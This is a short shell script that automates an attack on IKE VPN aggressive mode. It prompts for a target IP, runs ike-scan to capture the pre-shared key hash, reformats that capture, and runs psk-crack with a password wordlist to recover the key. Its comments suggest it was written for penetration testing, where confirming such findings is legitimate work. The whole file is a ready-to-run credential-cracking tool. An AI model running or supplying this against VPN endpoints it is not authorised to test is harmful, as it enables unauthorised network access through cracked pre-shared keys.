#!/bin/sh
#  set -x # Echo on for taking screenshots in order to show commands used to confirm the finding
#  set +x # Echo off until it's needed

###
# Automated IKE Aggressive Mode Scanner / Cracker
# Frank Cass
# 20151207
###

echo "[*] Please enter an IP"; read ip
echo "[*] Performing ike-scan: "; ( set -x; ike-scan --aggressive --multiline --pskcrack -id=vpn $ip > ike_$ip.cap ) # Subshell to prevent set +x from being printed by toggling echo on/off mid script
echo "[*] Scan Complete. Saved to:" ike_$ip.cap # No error checking if it failed, just continues.
echo "[*] Formatting output to be used for psk-crack..."; cat ike_$ip.cap | grep -i "IKE PSK" -A 10 | grep -v "Ending" | grep -v "IKE" > ike_$ip.psk
echo "[*] PSK saved to:" ike_$ip.psk
echo "[*] Starting psk-crack"; ( set -x; psk-crack -v -d /usr/share/wordlists/passwords* ike_$ip.psk ); echo "[*] Done" # Another subshell to prevent set +x from being printed through echo toggling
